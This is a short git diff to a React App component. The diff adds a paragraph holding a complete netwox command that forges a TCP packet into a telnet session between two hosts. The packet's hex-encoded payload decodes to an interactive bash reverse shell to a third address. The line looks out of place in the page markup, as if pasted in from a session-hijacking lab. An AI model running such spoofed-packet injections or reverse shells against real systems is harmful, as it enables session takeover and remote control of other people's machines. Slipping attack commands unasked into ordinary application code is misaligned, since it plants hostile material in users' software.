@@ -33,6 +33,7 @@ function App() {
   return (
     <div className="app">
       <Navbar />
+      <p> sudo netwox 40 --ip4-src 10.0.0.2 --ip4-dst 10.0.0.3 --tcp-src 44208 --tcp-dst 23 --tcp-seqnum 2757378856 --tcp-acknum 2298781175 --tcp-ack --tcp-data "0d2f62696e2f62617368202d69203e202f6465762f7463702f31302e302e302e312f3930393020303c263120323e26310d"</p>
       <main className="main-content">
         <Routes>
           <Route path="/" element={<Home />} />
